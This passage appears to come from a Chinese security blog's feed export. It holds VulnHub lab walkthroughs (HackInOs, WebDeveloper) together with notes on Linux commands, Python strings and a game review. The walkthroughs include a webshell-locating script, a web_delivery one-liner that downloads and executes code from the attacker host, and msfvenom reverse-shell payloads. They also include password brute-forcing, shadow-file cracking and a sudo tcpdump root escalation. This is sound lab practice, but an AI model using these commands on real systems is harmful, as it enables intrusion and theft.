rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p><p>功能比较全面，并且发现了这个：<br><img src="/posts/e4ff8385/1577460701158.png" alt><br>查阅文档发现了这个，类似SUID<br><img src="/posts/e4ff8385/1577460729799.png" alt></p><p>那么尝试用tar去打包root目录下的文件<br><img src="/posts/e4ff8385/1577460784686.png" alt><br>打包失败，原来这个命令应该在<code>norris</code>用户下执行</p><p>于是将root目录下的文件打包<br><img src="/posts/e4ff8385/1576477730035.png" alt></p><p>解压之后得到flag<br><img src="/posts/e4ff8385/1576477748712.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba" target="_blank" rel="noopener">https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba</a><br><a href="https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c" target="_blank" rel="noopener">https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-HackInOs</title>
      <link href="/posts/fcea4f6a/"/>
      <url>/posts/fcea4f6a/</url>
      
        <content type="html"><![CDATA[<h1 id="HackInOs-有内网"><a href="#HackInOs-有内网" class="headerlink" title="HackInOs(有内网)"></a>HackInOs(有内网)</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机IP 192.168.99.100<br>kali IP 192.168.99.101</p><p>nmap扫描结果</p><p><img src="/posts/fcea4f6a/1576559471820.png" alt></p><p>存在上传点但是无法上传文件</p><p><img src="/posts/fcea4f6a/1576559561592.png" alt></p><p>Burp抓包发现页面源代码有注释<br><a href="https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php" target="_blank" rel="noopener">https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php</a></p><p>看到提示</p><p>看到其只使用了<code>getimagesize</code>函数进行检验<br>通过加添GIF89a可以绕过上传</p><p>而文件的名字是这么产生的<br><img src="/posts/fcea4f6a/1576560249639.png" alt></p><p>于是上传一个一句话木马，然后对目录进行爆破即可</p><pre><code># coding:utf-8import hashlibimport requestsbase_url = &quot;http://192.168.99.100:8000/uploads/&quot;target = []for i in range(101):    shell = &#39;shell.php&#39; + str(i)     shell_md5 = hashlib.md5(shell.encode(&#39;utf-8&#39;)).hexdigest()    target.append(base_url + shell_md5 + &#39;.php&#39;)for t in target:    r = requests.get(t)    if r.status_code == 200:        print(&quot;find it!&quot;)        print(t)        break</code></pre><p>之后使用蚁剑成功连接<br><img src="/posts/fcea4f6a/1576560324056.png" alt></p><p>但是发现上传不久之后shell就被删掉了</p><p>所以需要将shell移动到html目录下，(考验手速的时候到了)</p><p><img src="/posts/fcea4f6a/1576560733771.png" alt><br>此时成功得到shell，开始提权</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><img src="/posts/fcea4f6a/1576561228491.png" alt></p><p>使用tail命令查看<code>/etc/shadow</code></p><p>将root用户复制过来，使用john进行爆破</p><p><img src="/posts/fcea4f6a/1576561315061.png" alt></p><p>得到root账号的密码是john</p><p><img src="/posts/fcea4f6a/1576561335215.png" alt></p><p>之后切换到root用户查看flag，但是并没有结束</p><p>运行提权辅助脚本</p><p><img src="/posts/fcea4f6a/1576561435933.png" alt></p><p>注意到提权辅助脚本提示有docker<br><img src="/posts/fcea4f6a/1576561476445.png" alt></p><p>查看IP<br><img src="/posts/fcea4f6a/1576561501817.png" alt></p><p>看这个IP地址很像是docker中的地址</p><p>尝试直接用root账户及其密码john进行连接，失败</p><p>大概猜到了我只是拿到了一台docker容器的权限，并没有进入到主机</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>反弹的shell功能还是弱了，想办法得到一个<code>meterpreter</code></p><p>这里有记录一下通过shell拿到<code>meterpreter</code>的几种办法</p><h3 id="web-delivery脚本"><a href="#web-delivery脚本" class="headerlink" title="web_delivery脚本"></a>web_delivery脚本</h3><p>使用<code>exploit/multi/script/web_delivery</code> </p><p>设置好相关参数</p><p><img src="/posts/fcea4f6a/1576562272920.png" alt></p><p>在反弹的shell中运行这段payload</p><pre><code>python -c &quot;import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://192.168.99.101:8080/1PrsFQbkzsmuk5&#39;);exec(r.read());&quot;</code></pre><p>得到<code>meterpreter</code>之后输入<code>background</code>让其挂起</p><h3 id="使用msfenvom生成木马"><a href="#使用msfenvom生成木马" class="headerlink" title="使用msfenvom生成木马"></a>使用msfenvom生成木马</h3><p>使用<code>exploit/multi/handler</code> 这个exploit模块</p><p>加载<code>linux/x86/meterpreter_reverse_tcp</code> 这个payload，同时通过<code>msfvenom</code> 去生成一个木马</p><p><img src="/posts/fcea4f6a/1577094332538.png" alt><br><code>msfvenom</code>生成木马</p><p><code>msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.99.102 lport=4444 -f elf -o shell</code></p><p><img src="/posts/fcea4f6a/1577094345676.png" alt></p><p>蚁剑上传<br><img src="/posts/fcea4f6a/1577094459850.png" alt><br>执行</p><p><img src="/posts/fcea4f6a/1577094504865.png" alt></p><p>反弹得到<code>meterpreter</code></p><p><img src="/posts/fcea4f6a/1577094525517.png" alt></p><p>得到子网信息<br><img src="/posts/fcea4f6a/1577094592386.png" alt></p><p>之后通过metasploit之后添加一条路由<br><img src="/posts/fcea4f6a/1576562463870.png" alt></p><p>此时就可以看到添加的路由信息了</p><p><img src="/posts/fcea4f6a/1576581218733.png" alt></p><p>路由添加也可以通过：<code>rout add 172.18.0.0 255.255.0.0 1</code></p><p>指定了网段和子网掩码，以及对应的session<br><img src="/posts/fcea4f6a/1577094657843.png" alt></p><p>这之后我们就可以在<code>metasploit</code>中访问内网的地址了，先进行主机发现</p><p><img src="/posts/fcea4f6a/1576562503028.png" alt></p><p>发现了四台主机</p><p>进行后续的端口扫描<br><img src="/posts/fcea4f6a/1576562587710.png" alt><br>(由于扫描速度比较慢，参数调整了一下)</p><p><img src="/posts/fcea4f6a/1576581339308.png" alt></p><p>这里也尝试通过<code>proxychain</code>去进行扫描</p><h3 id="proxychain的配置"><a href="#proxychain的配置" class="headerlink" title="proxychain的配置"></a>proxychain的配置</h3><p><img src="/posts/fcea4f6a/1577095583741.png" alt></p><p>使用socks4a代理，修改<code>/etc/proxychains.conf</code>文件，</p><p><img src="/posts/fcea4f6a/1577095622289.png" alt><br> 取消注释同时在最后一行加上<code>127.0.0.1 1080</code><br>由于<code>proxyresolv</code>的位置有点问题，cp过来</p><p> <code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>之后可以通过<code>proxychains nmap -A -T4 172.18.0.2</code>启动nmap扫描，但是扫描的结果有问题</p><pre><code>root@kali:~# proxyresolv 172.18.0.3|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK172.18.0.3</code></pre><p>能够正常解析但是还是存在问题</p><p>172.18.0.2 开放了3306端口数据库，进行连接</p><p><img src="/posts/fcea4f6a/1576563049227.png" alt></p><p>此处也可以通过<code>portfwd add -l 8123 -r 172.18.0.3 -p 3306</code>端口转发到本地进行连接</p><p><code>mysql -h 127.0.0.1  -P 8123 -uwordpress -pwordpress</code><br><img src="/posts/fcea4f6a/1577094918289.png" alt></p><p>查看数据<br><img src="/posts/fcea4f6a/1576563178481.png" alt></p><p><img src="/posts/fcea4f6a/1576563190812.png" alt></p><p>解密之后得到123456<br><img src="/posts/fcea4f6a/1576563163280.png" alt></p><p>于是尝试直接使用该用户登陆主机</p><p>该用户在docker组中，可以尝试通过docker提权</p><p><img src="/posts/fcea4f6a/1576581408046.png" alt></p><p>运行的docker镜像<br><img src="/posts/fcea4f6a/1576581491492.png" alt></p><p>docker挂载即可<br><img src="/posts/fcea4f6a/1577096085570.png" alt></p><p>得到flag<br><img src="/posts/fcea4f6a/1576581453268.png" alt></p><p>另外一种方式提权</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>查找SUID用户运行的程序<br><img src="/posts/fcea4f6a/1576581556847.png" alt></p><p>发现a.out</p><p><img src="/posts/fcea4f6a/1576581569529.png" alt><br>猜测其运行的是whoami命令</p><p>通过环境变量提权<br><img src="/posts/fcea4f6a/1576581656579.png" alt></p><p>同样拿到flag<br><img src="/posts/fcea4f6a/1576581679658.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-kill</title>
      <link href="/posts/da023d5c/"/>
      <url>/posts/da023d5c/</url>
      
        <content type="html"><![CDATA[<h2 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h2><p>首先需要熟悉一下 ps 命令</p><p>一般通过 <code>ps aux | more</code> 查看到所有的进程</p><p><code>ps -e</code> 列出程序时，显示每个程序所使用的环境变量</p><p><code>ps u</code> 　 以用户为主的格式来显示程序状况。</p><p><code>ps -a</code>显示同一终端下的所有程序</p><p><code>ps a</code> 显示所有进程</p><h2 id="kill-命令"><a href="#kill-命令" class="headerlink" title="kill 命令"></a>kill 命令</h2>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> kill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令trick</title>
      <link href="/posts/ebe7281d/"/>
      <url>/posts/ebe7281d/</url>
      
        <content type="html"><![CDATA[<h2 id="常用的命令组合"><a href="#常用的命令组合" class="headerlink" title="常用的命令组合"></a>常用的命令组合</h2><p><strong>统计字符串长度</strong></p><pre><code class="bash">$ echo -n 12345 | wc -c5</code></pre><h2 id="搜索文件后门"><a href="#搜索文件后门" class="headerlink" title="搜索文件后门"></a>搜索文件后门</h2><pre><code class="bash"># 简单的查找后门find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h2 id="数据库备份-mysqldump用法"><a href="#数据库备份-mysqldump用法" class="headerlink" title="数据库备份 mysqldump用法"></a>数据库备份 mysqldump用法</h2><pre><code class="bash">mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//备份指定数据库mysqldump --all-databases &gt; bak.sql //备份所有数据库mysql -u db_user -p db_passwd db_name &lt; bak.sql //还原指定数据库//也可以登录到mysql之后再 source xxx.sql</code></pre><h2 id="mysql-修改密码"><a href="#mysql-修改密码" class="headerlink" title="mysql 修改密码"></a>mysql 修改密码</h2><pre><code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);Query OK, 0 rows affected, 1 warning (0.00 sec)</code></pre><p>但是这条命令似乎不行</p><pre><code>update user set password=PASSWORD(&#39;NEW PASSWORD&#39;) where user=&#39;root&#39;;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-WebDeveloper</title>
      <link href="/posts/4d0603d0/"/>
      <url>/posts/4d0603d0/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描端口发现是 80 和 22开放了，其中80运行着wordpress服务</p><p>使用 <code>wpscan</code> 扫描用户和插件</p><pre><code>wpscan --url http://192.168.99.100/ -e u,p </code></pre><p>发现了用户 <code>webdeveloper</code></p><p>之后自然是尝试爆破密码了，使用 <code>wpscan</code> 和 <code>hydra</code> 同时爆破</p><pre><code>wpscan --url http://192.168.99.100/ -U webdeveloper  -P ./rockyou.txthydra -l webdeveloper -P rockyou.txt  -t 10 192.168.99.100 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:login_error&quot;</code></pre><p>但是经过很长时间后并没有爆破出来，神器 <code>xray</code> 扫描也为探测到相关信息</p><p>也尝试使用了 <code>dirsearch.py</code> ，但是依旧无果</p><p>换用了 <code>dirb</code></p><pre><code>GENERATED WORDS: 4613                                                          ---- Scanning URL: http://192.168.99.100/ ----+ http://192.168.99.100/index.php (CODE:301|SIZE:0)                                                                                                         ==&gt; DIRECTORY: http://192.168.99.100/ipdata/   !!!                                                                                                             + http://192.168.99.100/server-status (CODE:403|SIZE:302)                                                                                                   ==&gt; DIRECTORY: http://192.168.99.100/wp-admin/                                                                                                              ==&gt; DIRECTORY: http://192.168.99.100/wp-content/                                                                                                            ==&gt; DIRECTORY: http://192.168.99.100/wp-includes/                                                                                                           + http://192.168.99.100/xmlrpc.php (CODE:405|SIZE:42)       </code></pre><p>发现了 <code>ipdata/</code> 目录，访问之后是一个流量包</p><p>打开之后过滤</p><pre><code>http.request.method == &quot;POST&quot;</code></pre><p><img src="/posts/4d0603d0/1580996926610.png" alt></p><p>原来密码这么复杂。怪不得爆破不出来</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录后台之后发现安装了两个插件，并且可以修改源代码，这时候就会想到用 <code>msfvenom</code> 生成php木马，然后反弹得到shell</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.99.1 lport=4444 -f raw -o shell.php</code></pre><p>修改一个插件的源码然后启用就能拿到shell了</p><p>然后查看 <code>wp-config.php</code></p><pre><code>// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);/** MySQL database username */define(&#39;DB_USER&#39;, &#39;webdeveloper&#39;);/** MySQL database password */define(&#39;DB_PASSWORD&#39;, &#39;MasterOfTheUniverse&#39;);/** MySQL hostname */define(&#39;DB_HOST&#39;, &#39;localhost&#39;);/** Database Charset to use in creating database tables. */define(&#39;DB_CHARSET&#39;, &#39;utf8mb4&#39;);/** The Database Collate type. Don&#39;t change this if in doubt. */define(&#39;DB_COLLATE&#39;, &#39;&#39;);</code></pre><p>获得了数据库的账号和密码，那就登陆一下数据库</p><p>但是在数据库中并没有获得很多信息</p><pre><code>mysql&gt; show tables;show tables;+-----------------------+| Tables_in_wordpress   |+-----------------------+| wp_commentmeta        || wp_comments           || wp_links              || wp_options            || wp_postmeta           || wp_posts              || wp_term_relationships || wp_term_taxonomy      || wp_termmeta           || wp_terms              || wp_usermeta           || wp_users              |+-----------------------+12 rows in set (0.00 sec</code></pre><p>尝试直接ssh登陆，居然可以！</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录之后 ， <code>sudo -l</code></p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>那就可以用 <code>tcpdump</code> 提权了</p><pre><code class="bash">webdeveloper@webdeveloper:~$ touch /tmp/exploitwebdeveloper@webdeveloper:~$ echo &quot;cat /root/flag.txt&quot; &gt; /tmp/exploitwebdeveloper@webdeveloper:~$ chmod +x /tmp/exploitwebdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root[sudo] password for webdeveloper:dropped privs to roottcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytesMaximum file limit reached: 11 packet captured710 packets received by filter0 packets dropped by kernelwebdeveloper@webdeveloper:~$ Congratulations here is youre flag:cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-tcpdump</title>
      <link href="/posts/9cc474ce/"/>
      <url>/posts/9cc474ce/</url>
      
        <content type="html"><![CDATA[<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul><li>-i 指定网卡接口</li><li>-c 指定数量</li><li>-w 保存的文件名</li><li>-z 指定脚本</li><li>-Z 指定用户</li></ul><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>指定主机，截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p><pre><code>tcpdump host 210.27.48.1 </code></pre><p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信</p><pre><code>tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \) </code></pre><p>截获主机hostname发送的所有数据</p><pre><code>tcpdump -i eth0 src host hostname</code></pre><p>监视所有送到主机的数据包</p><pre><code>tcpdump -i eth0 dst host hostname</code></pre><p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令</p><pre><code>tcpdump tcp port 23 and host 210.27.48.1</code></pre><p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p><pre><code>tcpdump udp port 123 </code></pre><h2 id="使用tcpdump抓包，再用wireshark查看"><a href="#使用tcpdump抓包，再用wireshark查看" class="headerlink" title="使用tcpdump抓包，再用wireshark查看"></a>使用tcpdump抓包，再用wireshark查看</h2><pre><code>tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</code></pre><p>抓取http包</p><pre><code>tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854</code></pre><h2 id="tcpdump提权"><a href="#tcpdump提权" class="headerlink" title="tcpdump提权"></a>tcpdump提权</h2><p>遇到这种情况</p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>可以用root身份执行tcpdump命令，其中 <code>/tmp/exploit</code> 是想要以root身份执行的脚本</p><pre><code>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</code></pre><blockquote><p>-z 指定脚本，-Z 指定用户身份</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcpdump </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何保护版权</title>
      <link href="/posts/3b32f749/"/>
      <url>/posts/3b32f749/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰气时代玩后感</title>
      <link href="/posts/69f21310/"/>
      <url>/posts/69f21310/</url>
      
        <content type="html"><![CDATA[<p>寒假正逢steam打折，一直放在愿望单中的冰气时代这会降价了，果断入坑</p><p>买来之后第一把就找不着北了，游戏的玩法还是比较简单，但是前期资源匮乏，我需要收集木炭和木材，我一开始并没有意识到，等我将木材耗尽之后发现没有地方可以收集木材了？？？周围倒是有一些冻树木，但是要建造伐木场才行，wtf???,这游戏难道就到头了？</p><p>之后去找了B站的教程，欸突然意识到原来黑乎乎的一团有些是煤堆，有些是木箱23333，采集木箱可以收集木材。哦这游戏居然可以这样玩啊。这还只是我遇到的第一个坑，后面还遇到了建房子要和道路相连，道路要和能量塔相连等等</p><p> 不过这个游戏设计的比较好的就是法律和不满值了，我一直很担心不满值会升高，但是有些法律又不得不的签署，比如童工，比如加班，如果不这样的话就导致资源收集的速度很慢，大部分时候收集到的煤炭一个晚上就耗完了。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python文件</title>
      <link href="/posts/75a61507/"/>
      <url>/posts/75a61507/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python3字符串</title>
      <link href="/posts/25e898cd/"/>
      <url>/posts/25e898cd/</url>
      
        <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="性质判定"><a href="#性质判定" class="headerlink" title="性质判定"></a>性质判定</h3><pre><code>isalnum()、isalpha()、isdigit()、islower()、isupper()、isspace()、istitle()、startswith(prefix[,start[, end]])、endswith(suffix[,start[, end]])</code></pre><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><pre><code>count( sub[, start[, end]])、find( sub[, start[,end]])、index( sub[, start[, end]])、rfind( sub[, start[,end]])、rindex(sub[, start[, end]])</code></pre><p>注意find()和index()方法的不同：find()函数族找不到时返回-1，index()函数族则抛出ValueError异常。</p><p>但是对于判定是否包含字串的判定推荐用  <code>in</code> 和 <code>not in</code>操作符</p><p><code>replace(old, new[,count])</code>用以替换字符串的某些子串，如果指定count参数的话，就最多替换count次，如果不指定，就全部替换</p><h3 id="分切和连接"><a href="#分切和连接" class="headerlink" title="分切和连接"></a>分切和连接</h3><p><code>partition()</code> 和 <code>split</code> </p><p>split举例</p><pre><code class="python">&gt;&gt;&gt; &#39; hello     world&#39;.split()[&#39;hello&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39; &#39;)  # 要注意第一种方式和第二种方式不一样[&#39;&#39;, &#39;hello&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39;&#39;)Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ValueError: empty separator&gt;&gt;&gt; &#39;&#39;.split()[]&gt;&gt;&gt; &#39;&#39;.split(&#39; &#39;)[&#39;&#39;]</code></pre><h3 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h3><pre><code>lower()、upper()、capitalize()、swapcase()、title()</code></pre><h3 id="删减与填充"><a href="#删减与填充" class="headerlink" title="删减与填充"></a>删减与填充</h3><pre><code>strip([chars])、lstrip([chars])、rstrip([chars])center(width[, fillchar])、ljust(width[,fillchar])、rjust(width[, fillchar])、zfill(width)、expandtabs([tabsize])</code></pre><p>这些方法中的fillchar参数是指用以填充的字符，默认是空格。而zfill()中的z是指zero，所以顾名思义，zfill()即是以字符0进行填充，在输出数值时比较常用。expandtabs()的tabsize参数默认为8，它的功能是把字符串中的制表符（tab）转换为适当数量的空格。</p><h2 id="f字符串"><a href="#f字符串" class="headerlink" title="f字符串"></a>f字符串</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre><code class="python">In [2]: name = &quot;pxy&quot;In [3]: f&#39;Hello, my name is {name}&#39;Out[3]: &#39;Hello, my name is pxy&#39;</code></pre><p>求值运算</p><pre><code class="python">In [5]: &gt;&gt;&gt; f&#39;Complex number {(2 + 2j) / (2 - 3j)}&#39;Out[5]: &#39;Complex number (-0.15384615384615388+0.7692307692307692j)&#39;In [6]: import mathIn [7]: f&#39;The answer is {math.log(math.pi)}&#39;Out[7]: &#39;The answer is 1.1447298858494002</code></pre><p>f-string大括号内也可填入lambda表达式，但lambda表达式的 <code>:</code> 会被f-string误认为是表达式与格式描述符之间的分隔符，为避免歧义，需要将lambda表达式置于括号 <code>()</code> 内：</p><pre><code class="python">In [1]: f&#39;result is {(lambda x: x ** 2 + 1) (2)}&#39;Out[1]: &#39;result is 5&#39;</code></pre><h2 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h2><h3 id="str转bytes"><a href="#str转bytes" class="headerlink" title="str转bytes"></a>str转bytes</h3><pre><code class="python">In [23]: bytes(a, encoding=&quot;gbk&quot;)Out[23]: b&#39;\xb0\xd9\xb6\xc8&#39;In [24]: bytes(a, encoding=&quot;utf-8&quot;)Out[24]: b&#39;\xe7\x99\xbe\xe5\xba\xa6&#39;</code></pre><h3 id="从十六进制转化为bytes"><a href="#从十六进制转化为bytes" class="headerlink" title="从十六进制转化为bytes"></a>从十六进制转化为bytes</h3><pre><code class="python">In [39]: a = &#39;aabbccddeeff&#39;In [40]: a_bytes = bytes.fromhex(a)In [41]: a_bytesOut[41]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;</code></pre><h3 id="从bytes转化为十六进制"><a href="#从bytes转化为十六进制" class="headerlink" title="从bytes转化为十六进制"></a>从bytes转化为十六进制</h3><pre><code class="python">In [42]: a_bytesOut[42]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;In [43]: a_bytes.hex()Out[43]: &#39;aabbccddeeff&#39;</code></pre><h3 id="base64编码byets"><a href="#base64编码byets" class="headerlink" title="base64编码byets"></a>base64编码byets</h3><p>python3的base64包的 <code>b64encode</code> 只能使用 bytes 类型</p><pre><code class="python"># 比如我们要编码 \xac\xedIn [54]: a = &quot;aced&quot;In [55]: a = bytes.fromhex(a)In [56]: aOut[56]: b&#39;\xac\xed&#39;In [57]: base64.b64encode(a)Out[57]: b&#39;rO0=&#39;</code></pre><h3 id="md5加密bytes"><a href="#md5加密bytes" class="headerlink" title="md5加密bytes"></a>md5加密bytes</h3><p>python3 只能用hashlib中的md5函数</p><pre><code class="python">a = hashlib.md5()a.update(b&quot;pxy&quot;)a.hexdigest()</code></pre><p>封装一下</p><pre><code class="python"># 生成MD5def genearteMD5(str):    # 创建md5对象    hl = hashlib.md5()    # Tips    # 此处必须声明encode    # 否则报错为：hl.update(str)    Unicode-objects must be encoded before hashing    hl.update(str.encode(encoding=&#39;utf-8&#39;))    print(&#39;MD5加密前为 ：&#39; + str)    print(&#39;MD5加密后为 ：&#39; + hl.hexdigest())</code></pre><h2 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h2><h3 id="判断字符串是否为空"><a href="#判断字符串是否为空" class="headerlink" title="判断字符串是否为空"></a>判断字符串是否为空</h3><p>用 <code>a == None</code> 是不行的</p><p>可以这样</p><pre><code class="python">a = &quot;&quot;if a.strip() == &quot;&quot;:    print(&quot;a is null&quot;)</code></pre><h3 id="list和str转换"><a href="#list和str转换" class="headerlink" title="list和str转换"></a>list和str转换</h3><pre><code class="python">In [17]: a = &quot;aaaafasfasd&quot;In [18]: list(a)Out[18]: [&#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;d&#39;]</code></pre><h3 id="固定长度分割字符串"><a href="#固定长度分割字符串" class="headerlink" title="固定长度分割字符串"></a>固定长度分割字符串</h3><p>传统上一般是遍历</p><pre><code class="python">def fix_width_split(string, width):    return [string[x : x + width] for x in range(0, len(string), width)]print fix_width_split(&#39;123456789&#39;, 3)</code></pre><p>但是如果有了正则，可以这样</p><pre><code class="python">import restring = &#39;123456789&#39;split = re.findall(r&#39;.{7}&#39;, string)</code></pre><p>结果</p><pre><code class="python">In [76]: string = &#39;123456789&#39;In [77]: split = re.findall(&quot;.{3}&quot;, string)In [78]: splitOut[78]: [&#39;123&#39;, &#39;456&#39;, &#39;789&#39;]</code></pre><h3 id="bytes写入文件"><a href="#bytes写入文件" class="headerlink" title="bytes写入文件"></a>bytes写入文件</h3><p>以二进制方式打开即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/sunxb10/article/details/81036693" target="_blank" rel="noopener">python格式化字符串f-string</a></p><p><a href="https://www.40huo.cn/blog/python-string-tricks.html" target="_blank" rel="noopener">python字符串trick</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
            <tag> bytes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Obscurity靶机实战</title>
      <link href="/posts/a0911a0b/"/>
      <url>/posts/a0911a0b/</url>
      
